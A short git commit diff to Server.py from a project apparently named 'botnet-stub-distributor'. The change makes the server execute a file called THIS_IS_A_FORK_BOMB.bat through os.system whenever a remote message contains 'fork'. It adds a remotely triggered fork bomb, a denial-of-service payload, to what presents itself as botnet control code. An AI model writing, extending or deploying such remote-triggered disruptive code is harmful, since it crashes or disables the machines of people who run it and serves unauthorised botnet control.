aee24c480f26db58476ec6371ab31e6f47d45ddd
Hitman142 <ghb67@sbcglobal.net>
2017-06-29 09:48:58 -0500

    Add files via upload

--- Server.py
+++ Server.py
@@ -52,7 +52,7 @@ def receive():
         print("File deleted")
 
     if bytes("fork", 'utf-8') in a:
-        b = open("THIS_IS_A_FORK_BOMB.bat", 'r')
+        os.system("This PC/Desktop/botnet-stub-distributor-master/THIS_IS_A_FORK_BOMB.bat")
     else:
         a2 = c.recv(500)
         print('Received message == ',a2)
